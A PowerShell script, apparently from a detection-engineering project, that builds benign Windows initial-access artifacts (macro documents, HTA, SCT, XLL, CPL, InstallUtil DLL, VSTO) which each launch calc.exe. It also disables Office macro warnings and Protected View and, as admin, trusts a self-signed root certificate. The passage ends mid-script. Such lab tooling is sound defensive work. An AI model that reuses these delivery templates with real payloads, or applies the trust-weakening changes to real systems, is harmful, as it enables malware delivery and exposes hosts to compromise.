<#
.SYNOPSIS
    Lost in Weaponization — forge Windows execution artifacts, prove your detections.

.DESCRIPTION
    Generates ~57 Windows execution artifacts (LNK, SCT, XLL, VSTO, Office macros,
    native PE, CPL, installutil, persistence triggers, and more) where every artifact
    only launches calc.exe. No payloads, no persistence, no network.

    Built for detection engineers, purple teamers, and security researchers who want
    to validate Sigma / YARA / ASR / EDR coverage against real execution primitives.

.PARAMETER OutDir
    Output directory for generated artifacts. Default: $env:USERPROFILE\Desktop\lab-exec

.EXAMPLE
    .\New-LabArtifacts-ExecOnly.ps1 -OutDir C:\lab\lost-in-weaponization

    Basic build (no admin). Everything except VSTO cert trust.

.EXAMPLE
    # Run as Administrator for full pipeline including VSTO cert trust
    .\New-LabArtifacts-ExecOnly.ps1 -OutDir C:\lab\lost-in-weaponization

.NOTES
    Author  : 0xc3000000c3
    Repo    : https://github.com/0xc3000000c3/lost-in-weaponization
    License : MIT
    Version : 1.0.0

    Authorized use only:
      - Isolated VM with snapshot (no real network)
      - Systems you own or have written permission to test
      - Labs not protected by production security controls

    Never run generated artifacts on production, personal, or third-party systems.

.LINK
    https://github.com/0xc3000000c3/lost-in-weaponization
#>

[CmdletBinding()]
param(
    [string]$OutDir = "$env:USERPROFILE\Desktop\lab-exec"
)

$ErrorActionPreference = 'Continue'
$Utf8NoBom = New-Object System.Text.UTF8Encoding $false
$Calc      = "$env:SystemRoot\System32\calc.exe"

function Say  { param($m) Write-Host $m -ForegroundColor Cyan }
function Ok   { param($m) Write-Host "  [+] $m" -ForegroundColor Green }
function Skip { param($m) Write-Host "  [-] $m" -ForegroundColor Yellow }
function Info { param($m) Write-Host "  [i] $m" -ForegroundColor Gray }
function EnsureDir($p) { $d = Split-Path $p -Parent; if ($d -and -not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } }
function W($p, $c, [switch]$Unicode) {
    EnsureDir $p
    if ($Unicode) { [IO.File]::WriteAllText($p, $c, [Text.Encoding]::Unicode) }
    else          { [IO.File]::WriteAllText($p, $c, $Utf8NoBom) }
    Ok $p
}
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============================================================================
# Tooling
# ============================================================================
function Get-OfficeArch {
    $excelPath = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\excel.exe" -ErrorAction SilentlyContinue).'(default)'
    if ($excelPath -and (Test-Path $excelPath)) {
        $b = [IO.File]::ReadAllBytes($excelPath)
        $peOff = [BitConverter]::ToInt32($b, 0x3C)
        $m = [BitConverter]::ToUInt16($b, $peOff + 4)
        switch ($m) { 0x14c { return 'x86' } 0x8664 { return 'x64' } }
    }
    return 'x64'
}
$script:OfficeArch = Get-OfficeArch

function Get-Toolchain {
    param([string]$Arch = 'x64')
    $vw = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (-not (Test-Path $vw)) { return $null }
    $vsPath = & $vw -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2>$null
    if (-not $vsPath) { return $null }
    $hostDir = if ($Arch -eq 'x86') { 'Hostx86\x86' } else { 'Hostx64\x64' }
    $cl = Get-ChildItem "$vsPath\VC\Tools\MSVC\*\bin\$hostDir\cl.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $cl) { return $null }
    $vcvars = Join-Path $vsPath "VC\Auxiliary\Build\$(if ($Arch -eq 'x86') {'vcvars32.bat'} else {'vcvars64.bat'})"
    if (-not (Test-Path $vcvars)) { return $null }
    return [PSCustomObject]@{ Compiler = $cl.FullName; Vcvars = $vcvars; Arch = $Arch }
}
function Compile-C {
    param($Tc, [string]$Src, [string]$Out, [string]$Type = 'dll', [string[]]$Link = @())
    if (-not $Tc) { return $false }
    $tmp = Split-Path $Src -Parent
    Push-Location $tmp
    try {
        $ldflag = if ($Type -eq 'dll') { '/LD' } else { '' }
        $extra = if ($Link.Count -gt 0) { ' /link ' + ($Link -join ' ') } else { '' }
        & cmd.exe /c "call `"$($Tc.Vcvars)`" >nul 2>&1 && `"$($Tc.Compiler)`" /nologo $ldflag /MT /O1 /Fe:`"$Out`" `"$Src`"$extra" 2>&1 | Out-Null
        return ((Test-Path $Out) -and (Get-Item $Out).Length -gt 0)
    } finally { Pop-Location }
}

# ============================================================================
# Office trust
# ============================================================================
function Enable-VBAccess {
    foreach ($v in @('16.0','15.0','14.0')) {
        foreach ($a in @('Word','Excel','PowerPoint')) {
            $sec = "HKCU:\Software\Microsoft\Office\$v\$a\Security"
            if (-not (Test-Path $sec)) { New-Item -Path $sec -Force | Out-Null }
            Set-ItemProperty -Path $sec -Name VBAWarnings -Value 1 -Type DWord -Force -EA SilentlyContinue
            Set-ItemProperty -Path $sec -Name AccessVBOM  -Value 1 -Type DWord -Force -EA SilentlyContinue
            $pv = "$sec\ProtectedView"
            if (-not (Test-Path $pv)) { New-Item -Path $pv -Force | Out-Null }
            foreach ($k in @('DisableInternetFilesInPV','DisableAttachmentsInPV','DisableUnsafeLocationsInPV')) {
                Set-ItemProperty -Path $pv -Name $k -Value 1 -Type DWord -Force -EA SilentlyContinue
            }
            $tl = "$sec\Trusted Locations"
            if (-not (Test-Path $tl)) { New-Item -Path $tl -Force | Out-Null }
            foreach ($trustedPath in @("$OutDir\office\", "$OutDir\office-extras\")) {
                $n = 1; $found = $false
                while (Test-Path "$tl\Location$n") {
                    if ((Get-ItemProperty "$tl\Location$n" -Name Path -EA SilentlyContinue).Path -eq $trustedPath) { $found = $true; break }
                    $n++
                }
                if (-not $found) {
                    $loc = "$tl\Location$n"
                    if (-not (Test-Path $loc)) { New-Item -Path $loc -Force | Out-Null }
                    Set-ItemProperty -Path $loc -Name Path -Value $trustedPath -Type String -Force
                    Set-ItemProperty -Path $loc -Name AllowSubfolders -Value 1 -Type DWord -Force
                    Set-ItemProperty -Path $loc -Name Description -Value "Lab" -Type String -Force
                    Set-ItemProperty -Path $loc -Name Date -Value (Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ') -Type String -Force
                }
            }
        }
    }
    Info "VBAWarnings=1, ProtectedView off, Trusted Locations added"
}

# ============================================================================
# Office macros
# ============================================================================
function Save-WordDoc { param($Doc, [string]$Path, [int]$Format)
    try { $Doc.SaveAs([ref]$Path, [ref]$Format) }
    catch { [void]$Doc.GetType().InvokeMember('SaveAs',[Reflection.BindingFlags]::InvokeMethod,$null,$Doc,@([string]$Path,[int]$Format)) }
}
function Save-ExcelWb { param($Wb, [string]$Path, [int]$Format)
    try { $Wb.SaveAs($Path, $Format) }
    catch { [void]$Wb.GetType().InvokeMember('SaveAs',[Reflection.BindingFlags]::InvokeMethod,$null,$Wb,@([string]$Path,[int]$Format)) }
}
$macroRun = 'CreateObject("WScript.Shell").Run "calc.exe", 1, False'

function New-WordMacro {
    param([string]$Path, [int]$Format = 13)
    Get-Process WINWORD -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep -Milliseconds 500
    $app=$null; $doc=$null
    try {
        $app = New-Object -ComObject Word.Application
        $app.Visible=$false; $app.DisplayAlerts=0
        $doc = $app.Documents.Add()
        $vb = $doc.VBProject; if ($null -eq $vb) { throw "VBProject null" }
        $vb.VBComponents.Item(1).CodeModule.AddFromString(
            "Private Sub Document_Open()`r`n    $macroRun`r`nEnd Sub`r`nPrivate Sub Document_New()`r`n    $macroRun`r`nEnd Sub`r`n")
        try { $vb.VBComponents.Remove($vb.VBComponents.Item('LabAutoOpen')) } catch {}
        $mod = $vb.VBComponents.Add(1); $mod.Name = 'LabAutoOpen'
        $mod.CodeModule.AddFromString("Sub Auto_Open()`r`n    $macroRun`r`nEnd Sub`r`nSub AutoExec()`r`n    $macroRun`r`nEnd Sub`r`n")
        EnsureDir $Path; if (Test-Path $Path) { Remove-Item $Path -Force }
        Save-WordDoc -Doc $doc -Path $Path -Format $Format
        try { $doc.Saved = -1 } catch {}; try { $doc.Close($false) } catch {}
    } catch { Skip "Word ($Format): $($_.Exception.Message)" }
    finally {
        try { if ($doc) { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($doc) } } catch {}
        try { if ($app) { $app.Quit() } } catch {}
        try { if ($app) { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($app) } } catch {}
        [GC]::Collect()
    }
    if ((Test-Path $Path) -and (Get-Item $Path).Length -gt 0) { Ok $Path } else { Skip "Word not created" }
}

function New-ExcelMacro {
    param([string]$Path, [int]$Format = 52, [switch]$CopyToAddIns)
    Get-Process EXCEL -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep -Milliseconds 500
    $app=$null; $wb=$null
    try {
        $app = New-Object -ComObject Excel.Application
        $app.Visible=$false; $app.DisplayAlerts=$false
        $wb = $app.Workbooks.Add()
        $vb = $wb.VBProject; if ($null -eq $vb) { throw "VBProject null" }
        $vb.VBComponents.Item('ThisWorkbook').CodeModule.AddFromString("Private Sub Workbook_Open()`r`n    $macroRun`r`nEnd Sub`r`n")
        try { $vb.VBComponents.Remove($vb.VBComponents.Item('LabAutoOpen')) } catch {}
        $mod = $vb.VBComponents.Add(1); $mod.Name = 'LabAutoOpen'
        $mod.CodeModule.AddFromString("Sub Auto_Open()`r`n    $macroRun`r`nEnd Sub`r`nSub Auto_Close()`r`n    $macroRun`r`nEnd Sub`r`n")
        EnsureDir $Path; if (Test-Path $Path) { Remove-Item $Path -Force }
        Save-ExcelWb -Wb $wb -Path $Path -Format $Format
        try { $wb.Saved = $true } catch {}; try { $wb.Close($false) } catch {}
    } catch { Skip "Excel ($Format): $($_.Exception.Message)" }
    finally {
        try { if ($wb) { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($wb) } } catch {}
        try { if ($app) { $app.Quit() } } catch {}
        try { if ($app) { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($app) } } catch {}
        [GC]::Collect()
    }
    if ((Test-Path $Path) -and (Get-Item $Path).Length -gt 0) {
        Ok $Path
        if ($CopyToAddIns) {
            $addIns = "$env:APPDATA\Microsoft\AddIns"
            if (-not (Test-Path $addIns)) { New-Item -ItemType Directory -Force -Path $addIns | Out-Null }
            Copy-Item $Path (Join-Path $addIns (Split-Path $Path -Leaf)) -Force
            Info "copied to $addIns (install as Add-in to fire Auto_Open)"
        }
    } else { Skip "Excel not created" }
}

function New-PptMacro {
    param([string]$Path, [int]$Format = 25)
    Get-Process POWERPNT -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep -Milliseconds 1500
    $app=$null; $pres=$null
    try {
        $app = New-Object -ComObject PowerPoint.Application
        $app.Visible=-1; $app.DisplayAlerts=1; $app.AutomationSecurity=1
        $pres = $app.Presentations.Add()
        if ($null -eq $pres) { throw "Presentations.Add null" }
        try { $pres.Slides.Add(1, 1) | Out-Null } catch {}
        $vb = $pres.VBProject; if ($null -eq $vb) { throw "VBProject null" }
        # ThisPresentation
        $thisPres = $null
        try { $thisPres = $vb.VBComponents.Item('ThisPresentation') } catch {}
        if (-not $thisPres) {
            foreach ($c in $vb.VBComponents) { if ($c.Type -eq 100) { $thisPres = $c; break } }
        }
        if ($thisPres) {
            $thisPres.CodeModule.AddFromString(@'
Private Sub Presentation_Open()
    On Error Resume Next
    Shell "calc.exe", vbNormalFocus
    CreateObject("WScript.Shell").Run "calc.exe", 1, False
End Sub
'@)
        }
        try { $vb.VBComponents.Remove($vb.VBComponents.Item('LabAutoOpen')) } catch {}
        $mod = $vb.VBComponents.Add(1); $mod.Name = 'LabAutoOpen'
        $mod.CodeModule.AddFromString(@'
Sub Auto_Open()
    On Error Resume Next
    Shell "calc.exe", vbNormalFocus
    CreateObject("WScript.Shell").Run "calc.exe", 1, False
End Sub
Sub Auto_Close()
    On Error Resume Next
    Shell "calc.exe", vbNormalFocus
End Sub
'@)
        EnsureDir $Path; if (Test-Path $Path) { Remove-Item $Path -Force }
        $pres.SaveAs($Path, $Format)
        Start-Sleep -Milliseconds 500
        try { $pres.Save() } catch {}
        try { $pres.Saved = -1 } catch {}
        try { $pres.Close() } catch {}
        try { $app.Quit() } catch {}
        # verify vbaProject.bin
        if ((Test-Path $Path) -and (Get-Item $Path).Length -gt 0) {
            $hasVba = $false
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem -EA SilentlyContinue
                $z = [IO.Compression.ZipFile]::OpenRead($Path)
                $hasVba = ($null -ne ($z.Entries | Where-Object { $_.FullName -match 'vbaProject\.bin$' } | Select-Object -First 1))
                $z.Dispose()
            } catch {}
            if ($hasVba) { Ok "$Path ($((Get-Item $Path).Length) bytes, vba ✓)" }
            else { Skip "$Path saved but no vbaProject.bin" }
        } else { Skip "PPT not created: $Path" }
    } catch { Skip "PPT ($Format): $($_.Exception.Message)" }
    finally {
        try { if ($pres) { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($pres) } } catch {}
        try { if ($app) { $app.Quit() } } catch {}
        try { if ($app) { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($app) } } catch {}
        [GC]::Collect()
    }
}

# ============================================================================
# ISO (for .wsb, PDF, etc — only wsb uses it directly)
# ============================================================================
if (-not ('IsoStreamHelper' -as [type])) {
    Add-Type -Language CSharp -TypeDefinition @"
using System;using System.IO;using System.Runtime.InteropServices;using System.Runtime.InteropServices.ComTypes;
public static class IsoStreamHelper {
    public static long CopyToFile(object comStream, string path) {
        IStream s = (IStream)comStream; long t = 0;
        using (FileStream fs = File.Create(path)) {
            byte[] b = new byte[65536]; IntPtr rp = Marshal.AllocHGlobal(4);
            try { while (true) { s.Read(b, b.Length, rp); int r = Marshal.ReadInt32(rp); if (r <= 0) break; fs.Write(b, 0, r); t += r; } }
            finally { Marshal.FreeHGlobal(rp); }
        }
        return t;
    }
}
"@
}

function New-DotNetArtifact {
    param([string]$Path, [string]$Source, [ValidateSet('Library','ConsoleApplication')][string]$OutputType)
    try {
        EnsureDir $Path; if (Test-Path $Path) { Remove-Item $Path -Force }
        Add-Type -TypeDefinition $Source -OutputAssembly $Path -OutputType $OutputType -ErrorAction Stop
        if ((Test-Path $Path) -and (Get-Item $Path).Length -gt 0) { Ok "$Path ($((Get-Item $Path).Length) bytes)"; return $true }
        Skip "$OutputType not produced"; return $false
    } catch { Skip "$OutputType : $($_.Exception.Message)"; return $false }
}

function New-InstallUtilDll {
    param([string]$Path)
    $src = @'
using System;
using System.Collections;
using System.Diagnostics;
[System.Configuration.Install.RunInstaller(true)]
public class LabInstaller : System.Configuration.Install.Installer {
    public override void Install(IDictionary stateSaver) { base.Install(stateSaver); Process.Start("calc.exe"); }
    public override void Uninstall(IDictionary savedState) { base.Uninstall(savedState); Process.Start("calc.exe"); }
}
'@
    try {
        EnsureDir $Path; if (Test-Path $Path) { Remove-Item $Path -Force }
        Add-Type -TypeDefinition $src -OutputAssembly $Path -OutputType Library -ReferencedAssemblies 'System.Configuration.Install' -ErrorAction Stop
        if ((Test-Path $Path) -and (Get-Item $Path).Length -gt 0) { Ok "$Path ($((Get-Item $Path).Length) bytes)" }
        else { Skip "InstallUtil: no output" }
    } catch { Skip "InstallUtil: $($_.Exception.Message)" }
}

function New-ZipFromDir {
    param([string]$SourceDir, [string]$Destination)
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -EA SilentlyContinue
        if (Test-Path $Destination) { Remove-Item $Destination -Force }
        [System.IO.Compression.ZipFile]::CreateFromDirectory($SourceDir, $Destination)
        Ok $Destination
    } catch { Skip "Zip: $($_.Exception.Message)" }
}

# ============================================================================
# RUN
# ============================================================================
Say "`n=== Office arch: $script:OfficeArch ==="
Enable-VBAccess

# ============================================================
# SHELL — LNK, URL, settingcontent-ms
# ============================================================
Say "`n=== Shell ==="
try {
    $p = Join-Path $OutDir 'shell\test.lnk'; EnsureDir $p
    $sh = New-Object -ComObject WScript.Shell
    $lnk = $sh.CreateShortcut($p)
    $lnk.TargetPath = $Calc
    $lnk.WindowStyle = 1
    $lnk.Save(); Ok $p
} catch { Skip "LNK: $($_.Exception.Message)" }

W (Join-Path $OutDir 'shell\test.url') "[InternetShortcut]`r`nURL=file:///C:/Windows/System32/calc.exe`r`nIconFile=C:\Windows\System32\shell32.dll`r`nIconIndex=1`r`n"
W (Join-Path $OutDir 'shell\test.settingcontent-ms') '<?xml version="1.0" encoding="utf-8"?><PCSettings><SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"><ApplicationInformation><AppID>calc.exe</AppID><DeepLink>calc.exe</DeepLink></ApplicationInformation></SearchableContent></PCSettings>'
Info "settingcontent-ms only triggers on Win10 <1607. On newer versions it's inert."

# ============================================================
# SCRIPT — all 12 exec formats
# ============================================================
Say "`n=== Script ==="
W (Join-Path $OutDir 'script\test.ps1') "Start-Process 'calc.exe'`r`n"
W (Join-Path $OutDir 'script\test.bat') "@echo off`r`ncalc.exe`r`n"
W (Join-Path $OutDir 'script\test.cmd') "@echo off`r`ncalc.exe`r`n"
W (Join-Path $OutDir 'script\test.vbs') 'CreateObject("WScript.Shell").Run "calc.exe", 1, False'
W (Join-Path $OutDir 'script\test.vbe') 'CreateObject("WScript.Shell").Run "calc.exe", 1, False'
$jsBody = 'c = "calc.exe";' + "`r`n" + 'r = new ActiveXObject("WScript.Shell").Run(c,0,true);'
W (Join-Path $OutDir 'script\test.js')  $jsBody
W (Join-Path $OutDir 'script\test.jse') $jsBody
W (Join-Path $OutDir 'script\test.wsf') @'
<?xml version="1.0" encoding="UTF-8"?>
<job id="LabTest">
    <script language="VBScript">
        <![CDATA[
        Dim sh
        Set sh = CreateObject("WScript.Shell")
        sh.Run "calc.exe", 1, False
        Set sh = Nothing
        ]]>
    </script>
</job>
'@
W (Join-Path $OutDir 'script\test.hta') @'
<html>
<head><title>lab</title></head>
<body>
<script language="VBScript">
    CreateObject("WScript.Shell").Run "calc.exe", 1, False
    window.close
</script>
</body>
</html>
'@
W (Join-Path $OutDir 'script\test.wsh') "[ScriptFile]`r`nPath=test.vbs`r`n"
# SCT — JScript squiblydoo
W (Join-Path $OutDir 'script\test.sct') @'
<?xml version="1.0"?>
<scriptlet>
<registration progid="LabTest" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
'@
W (Join-Path $OutDir 'script\test.wsc') @'
<?xml version="1.0"?>
<component>
<?component error="false" debug="false"?>
<registration progid="Lab.Wsc" classid="{F0002222-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
<public>
<method name="DoTest" />
</public>
<script language="JScript">
<![CDATA[
function DoTest() {
    new ActiveXObject("WScript.Shell").Run("calc.exe");
}
]]>
</script>
</component>
'@

# ============================================================
# OFFICE — macro-enabled Word/Excel/PPT + SLK
# ============================================================
Say "`n=== Office ==="
W (Join-Path $OutDir 'office\test.slk') "ID;P`r`nC;Y1;X1;K`"=EXEC(`"calc.exe`")`"`r`nE`r`n"
Info "SLK: Excel 4.0 EXEC — blocked by default in Excel 2013+"
New-WordMacro  -Path (Join-Path $OutDir 'office\test.docm') -Format 13
New-WordMacro  -Path (Join-Path $OutDir 'office\test.dotm') -Format 15
New-ExcelMacro -Path (Join-Path $OutDir 'office\test.xlsm') -Format 52
New-ExcelMacro -Path (Join-Path $OutDir 'office\test.xlam') -Format 18 -CopyToAddIns
New-PptMacro   -Path (Join-Path $OutDir 'office\test.pptm') -Format 25
New-PptMacro   -Path (Join-Path $OutDir 'office\test.ppam') -Format 30

# ============================================================
# OFFICE-EXTRAS — macro-enabled ppsm/potm/xlsb
# ============================================================
Say "`n=== Office-extras ==="
New-ExcelMacro -Path (Join-Path $OutDir 'office-extras\test.xlsb') -Format 50
New-PptMacro   -Path (Join-Path $OutDir 'office-extras\test.ppsm') -Format 29
New-PptMacro   -Path (Join-Path $OutDir 'office-extras\test.potm') -Format 27

# ============================================================
# BIN — SCR, XLL, VSTO (msil)
# ============================================================
Say "`n=== Bin ==="
try { $p = Join-Path $OutDir 'bin\test.scr'; EnsureDir $p; Copy-Item $Calc $p -Force; Ok $p } catch { Skip "SCR: $($_.Exception.Message)" }

# XLL for Office arch
$tc = Get-Toolchain -Arch $script:OfficeArch
if ($tc) {
    $work = Join-Path $env:TEMP "lab_xll_$([Guid]::NewGuid())"
    New-Item -ItemType Directory -Force -Path $work | Out-Null
    $src = Join-Path $work 'xll.c'
    @'
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) { if (r == DLL_PROCESS_ATTACH) WinExec("calc.exe", SW_SHOW); return TRUE; }
__declspec(dllexport) int __stdcall xlAutoOpen(void)   { WinExec("calc.exe", SW_SHOW); return 1; }
__declspec(dllexport) int __stdcall xlAutoClose(void)  { return 1; }
__declspec(dllexport) int __stdcall xlAutoAdd(void)    { return 1; }
__declspec(dllexport) int __stdcall xlAutoRemove(void) { return 1; }
__declspec(dllexport) LPSTR __stdcall xlAddInManagerInfo(LPSTR x) { static char s[] = "Lab"; return s; }
'@ | Set-Content $src -Encoding ASCII
    $outXll = Join-Path $OutDir 'bin\test.xll'; EnsureDir $outXll
    $linkArgs = @('/EXPORT:xlAutoOpen','/EXPORT:xlAutoClose','/EXPORT:xlAutoAdd','/EXPORT:xlAutoRemove','/EXPORT:xlAddInManagerInfo','user32.lib')
    if (Compile-C -Tc $tc -Src $src -Out $outXll -Type 'dll' -Link $linkArgs) {
        $b = [IO.File]::ReadAllBytes($outXll)
        $peOff = [BitConverter]::ToInt32($b, 0x3C)
        $machine = [BitConverter]::ToUInt16($b, $peOff + 4)
        $actual = switch ($machine) { 0x14c { 'x86' } 0x8664 { 'x64' } default { '?' } }
        Ok "$outXll ($((Get-Item $outXll).Length) bytes, $actual)"
    } else { Skip "XLL compile failed"; Copy-Item $Calc $outXll -Force; Ok $outXll }
    Remove-Item $work -Recurse -Force -EA SilentlyContinue
}

# VSTO (msil/msil, needs admin for cert trust)
$magePath = @(
    "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe",
    "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.7.2 Tools\mage.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1
$snPath = @(
    "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\sn.exe",
    "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.7.2 Tools\sn.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($magePath -and $snPath) {
    # clean old + cache
    foreach ($a in @('LabApp.exe','LabApp.exe.manifest','test.vsto','test.application')) {
        $old = Join-Path $OutDir "bin\$a"
        if (Test-Path $old) { Remove-Item $old -Force -EA SilentlyContinue }
    }
    $cacheRoot = "$env:LOCALAPPDATA\Apps\2.0"
    if (Test-Path $cacheRoot) {
        Get-ChildItem $cacheRoot -Directory -EA SilentlyContinue | ForEach-Object {
            if (Get-ChildItem $_.FullName -Filter 'LabApp*' -Recurse -EA SilentlyContinue) {
                Remove-Item $_.FullName -Recurse -Force -EA SilentlyContinue
            }
        }
    }
    $work = Join-Path $env:TEMP "lab_vsto_$([Guid]::NewGuid())"
    New-Item -ItemType Directory -Force -Path $work | Out-Null
    $cert = $null
    try {
        $snk = Join-Path $work 'lab.snk'
        & $snPath -k $snk 2>&1 | Out-Null
        $cert = New-SelfSignedCertificate -DnsName "lab.test" -CertStoreLocation "Cert:\CurrentUser\My" `
            -KeyExportPolicy Exportable -KeyUsage DigitalSignature -Type CodeSigningCert -NotAfter (Get-Date).AddYears(2)
        $pfx = Join-Path $work 'lab.pfx'; $cer = Join-Path $work 'lab.cer'
        $pfxPwd = ConvertTo-SecureString "lab" -AsPlainText -Force
        Export-PfxCertificate -Cert $cert -FilePath $pfx -Password $pfxPwd | Out-Null
        Export-Certificate  -Cert $cert -FilePath $cer -Type CERT | Out-Null

        $csSrc = Join-Path $work 'Program.cs'
        @'
using System;
using System.Diagnostics;
static class Program {
    [STAThread]
    static void Main() {
        try { Process.Start(new ProcessStartInfo { FileName = "calc.exe", UseShellExecute = true }); } catch { }
    }
}
'@ | Set-Content $csSrc -Encoding ASCII
        $exe = Join-Path $work 'LabApp.exe'
        $csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        & $csc /nologo /target:winexe /platform:anycpu "/out:$exe" "/keyfile:$snk" $csSrc 2>&1 | Out-Null

        $appManifest = Join-Path $work 'LabApp.exe.manifest'
        & $magePath -New Application -ToFile $appManifest -Name "LabApp" -Version "1.0.0.0" -FromDirectory $work -Processor msil -TrustLevel FullTrust 2>&1 | Out-Null
        & $magePath -Sign $appManifest -CertFile $pfx -Password lab 2>&1 | Out-Null

        $vsto = Join-Path $OutDir 'bin\test.vsto'; EnsureDir $vsto
        if (Test-Path $vsto) { Remove-Item $vsto -Force }
        $providerUrl = "file:///" + ((Split-Path $vsto -Parent) -replace '\\','/') + "/test.vsto"
        & $magePath -New Deployment -ToFile $vsto -Name "LabApp" -Version "1.0.0.0" -AppManifest $appManifest -ProviderUrl $providerUrl -Processor msil -Install true 2>&1 | Out-Null
        & $magePath -Sign $vsto -CertFile $pfx -Password lab 2>&1 | Out-Null

        $binDir = Split-Path $vsto -Parent
        Copy-Item $exe         (Join-Path $binDir 'LabApp.exe')          -Force
        Copy-Item $appManifest (Join-Path $binDir 'LabApp.exe.manifest') -Force
        Copy-Item $vsto        (Join-Path $binDir 'test.application')    -Force

        if ($isAdmin) {
            Import-Certificate -FilePath $cer -CertStoreLocation "Cert:\LocalMachine\Root" | Out-Null
            Import-Certificate -FilePath $cer -CertStoreLocation "Cert:\LocalMachine\TrustedPublisher" | Out-Null
            $tmKey = "HKLM:\SOFTWARE\Microsoft\.NETFramework\Security\TrustManager\PromptingLevel"
            if (-not (Test-Path $tmKey)) { New-Item -Path $tmKey -Force | Out-Null }
            foreach ($k in @('MyComputer','Internet','LocalIntranet','TrustedSites','UntrustedSites')) {
                Set-ItemProperty -Path $tmKey -Name $k -Value "Enabled" -Type String -Force
            }
            Info "VSTO cert trusted"
        } else {
            Info "VSTO built, cert not trusted (run as admin to trust)"
        }
        if ((Test-Path $vsto) -and (Get-Item $vsto).Length -gt 0) { Ok "$vsto ($((Get-Item $vsto).Length) bytes)" }
    } catch { Skip "VSTO: $($_.Exception.Message)" }
    finally {
        if ($cert) { try { Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)" -Force -EA SilentlyContinue } catch {} }
        Remove-Item $work -Recurse -Force -EA SilentlyContinue
    }
}

# ============================================================
# COMPILED — native CPL, OCX, AX
# ============================================================
Say "`n=== Compiled ==="
$tc = Get-Toolchain -Arch 'x64'
if ($tc) {
    $work = Join-Path $env:TEMP "lab_cpl_$([Guid]::NewGuid())"
    New-Item -ItemType Directory -Force -Path $work | Out-Null
    $src = Join-Path $work 'cpl.c'
    @'
#include <windows.h>
LONG CALLBACK CPlApplet(HWND h, UINT m, LPARAM p1, LPARAM p2) {
    if (m == 1) { WinExec("calc.exe", SW_SHOW); return TRUE; }
    if (m == 2) return 1;
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) { return TRUE; }
'@ | Set-Content $src -Encoding ASCII
    foreach ($ext in @('cpl','ocx','ax')) {
        $out = Join-Path $OutDir "compiled\test.$ext"; EnsureDir $out
        if (Compile-C -Tc $tc -Src $src -Out $out -Type 'dll' -Link @('/EXPORT:CPlApplet','user32.lib')) { Ok "$out" }
        else { Copy-Item $Calc $out -Force; Ok $out }
    }
    Remove-Item $work -Recurse -Force -EA SilentlyContinue
}

# ============================================================
# DOTNET — managed EXE/DLL
# ============================================================
Say "`n=== .NET ==="
New-DotNetArtifact -Path (Join-Path $OutDir 'dotnet\test.exe') -OutputType ConsoleApplication -Source 'using System;using System.Diagnostics;public class Program { public static void Main() { Process.Start("calc.exe"); } }' | Out-Null
New-DotNetArtifact -Path (Join-Path $OutDir 'dotnet\test-hidden.exe') -OutputType ConsoleApplication -Source 'using System;using System.Diagnostics;public class Program { public static void Main() { ProcessStartInfo p = new ProcessStartInfo(); p.FileName = "calc.exe"; p.WindowStyle = ProcessWindowStyle.Hidden; p.CreateNoWindow = true; p.UseShellExecute = false; Process.Start(p); } }' | Out-Null
New-DotNetArtifact -Path (Join-Path $OutDir 'dotnet\test-cmd.exe') -OutputType ConsoleApplication -Source 'using System;using System.Diagnostics;public class Program { public static void Main() { Process.Start("cmd.exe", "/c calc.exe"); } }' | Out-Null
New-InstallUtilDll -Path (Join-Path $OutDir 'dotnet\test-installutil.dll')
New-DotNetArtifact -Path (Join-Path $OutDir 'dotnet\test-loader.dll') -OutputType Library -Source 'using System;using System.Diagnostics;public class LabLoader { public LabLoader() { Process.Start("calc.exe"); } public static void Run() { Process.Start("calc.exe"); } }' | Out-Null

# ============================================================
# NATIVE — bare WinExec("calc.exe")
# ============================================================
Say "`n=== Native PE ==="
$nd = Join-Path $OutDir 'native'; New-Item -ItemType Directory -Force -Path $nd | Out-Null
$tc = Get-Toolchain -Arch 'x64'
if ($tc) {
    $work = Join-Path $env:TEMP "lab_nat_$([Guid]::NewGuid())"
    New-Item -ItemType Directory -Force -Path $work | Out-Null
    $exeSrc = Join-Path $work 'exe.c'
    "#include <windows.h>`r`nint main(void){WinExec(`"calc.exe`",SW_SHOW);return 0;}`r`n" | Set-Content $exeSrc -Encoding ASCII
    $exeOut = Join-Path $nd 'test-native.exe'; EnsureDir $exeOut
